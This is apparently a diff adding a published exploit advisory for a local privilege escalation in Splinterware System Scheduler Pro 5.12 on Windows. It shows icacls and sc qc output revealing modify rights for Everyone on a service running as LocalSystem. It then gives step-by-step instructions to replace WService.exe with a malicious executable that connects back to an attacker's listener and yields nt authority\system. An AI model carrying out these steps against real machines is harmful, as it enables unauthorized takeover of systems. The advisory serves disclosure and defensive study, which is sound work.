@@ -1,0 +1,62 @@
+# Exploit Title: Splinterware System Scheduler Pro 5.12 - Privilege Escalation
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Date: 2018-07-21
+# Vulnerable Software: System Scheduler Pro 5.12
+# Vendor Homepage: https://www.splinterware.com
+# Version: 5.12
+# Tested Windows 7 SP1 x86
+# CVE: N/A
+
+# Description:
+# Splinterware System Scheduler Pro 5.12 suffers from 
+# Privilege Escalation due to insecure file permissions
+
+# Prerequisites
+# To successfully exploit this vulnerability, the System Scheduler service must already be installed.
+
+# Details
+# By default the Everyone group has the modify permission to System Schedule files as shown below.  
+# With the service installed, a low privilege account is able to rename the WService.exe file located in 
+# this same path and replace with a malicious file that would connect back to an attacking computer giving system level privileges 
+# (nt authority\system) due to the service running as Local System.  While a low privilege user is unable to restart the service 
+# through the application, the service is checked periodically triggering the execution of the malicious file.
+
+C:\>icacls "c:\Program Files (x86)\SystemScheduler"
+Everyone:(OI)(CI)(M)
+NT SERVICE\TrustedInstaller:(I)(F)
+NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+NT AUTHORITY\SYSTEM:(I)(F)
+NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+BUILTIN\Administrators:(I)(F)
+BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+BUILTIN\Users:(I)(RX)
+BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+C:\>sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WindowsScheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+		
+# Proof of Concept
+1. Login as regular user where Splinterware System Scheduler Pro 5.12 and the service are installed 
+2. Create malicious .exe with same name 'wservice.exe' that can connect back to attacking machine
+3. Download malicious .exe on victim machine, and setup listener on attacking machine
+4. Rename original wservice.exe file to wservice.bak, and copy malicious file to location of original   
+5. wait short amount of time and check attacking machine listener
+6. connection back from victim machine successful, run whoami
+
+nt authority\system
